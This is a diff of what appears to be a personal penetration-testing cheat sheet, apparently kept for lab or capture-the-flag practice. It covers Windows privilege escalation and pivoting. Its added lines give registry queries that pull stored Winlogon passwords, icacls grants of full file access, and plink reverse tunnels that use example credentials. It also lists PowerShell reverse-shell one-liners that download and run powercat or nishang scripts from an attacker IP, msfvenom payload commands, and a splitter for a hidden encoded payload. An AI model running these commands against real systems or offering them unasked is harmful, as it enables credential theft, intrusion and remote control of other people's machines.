@@ -275,24 +275,29 @@ Windows Enumeration:
 - Stored Passwrods
 - check the registry. you may find a default password
 -     reg query HKLM /f password /t REG_SZ /s
-  
+- if you find any default password run the following
+-     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+- if there is ssh running on the system use the found credentials to login
+
+**keep in mind to check the permissions in windows like icacls, icacls root.txt /grant <username>:F (this will grant full access to a file)**
+
 1- Escalation Path - Kernel Exploitation
 here is all kernel exploitation from GitHub: https://github.com/SecWiki/windows-kernel-exploits
 - run systeminfo command on the target system then user windows-exploit-suggester-python3 to find exploits.
 
-- Port Forwarding
-- - check the open ports in the machine
+2- Port Forwarding
+- check the open ports in the machine
 -     netstat -ano
 - after netstat -ano command you find a public port you can use plink.exe to connect to that port
-- transfer plink.exe file to the windows machine using cetutil tool
-- install ssh and edit the config file
--     apt install ssh && gedit /etc/ssh/sshd_config
+- download and transfer plink.exe file to the windows machine using cetutil tool
+- install ssh and edit the config file (kali)
+-     apt install ssh && nano /etc/ssh/sshd_config
 - change #PermitRootLogin line in the sshd_config file to the following
 -     PermitRootLogin yes
 -     service ssh restart && service ssh enable
 - from the Windows machine
 -     plink.exe -l <KaliUser> -pw <KaliPasswd> -R <ServicePort in Windows>:127.0.0.1:<KaliPort> <KaliIP>
-- assume windows has a local smb service running on 445 and your kali machine is 10.10.16.9
+- assume windows has a local smb service running on 445 and your kali machine is 10.10.16.9. if you have credentials you can use tool like psexec to login but if you don't have use the following tunneling
 -     plink.exe -l raman -pw to0or -R 445:127.0.0.1:445 10.10.16.9
 - keep on hitting enter and you will get a root shell (this is the windows machine not kali machine)
 - now you need to use winexe tool to execute a command in windows
@@ -743,7 +748,7 @@ sudo fuser -k 443/tcp
 - encode the following PowerShell reverse shell
 -     IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
 -     msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o /home/raman/Desktop/payload.hta
-- nishang reverse powershell with bypassing the double quotes
+- nishang reverse powershell with bypassing the double quotes. keep the Invoke-powershelltcp.ps1 ready then start http server and use the following command to get a shell
 -     msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.9/Invoke-PowerShellTcp.ps1')\""
 - use the following function to split the payload
 -     str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..." n = 50 for i in range(0, len(str), n): print("Str = Str + " + '"' + str[i:i+n] + '"')
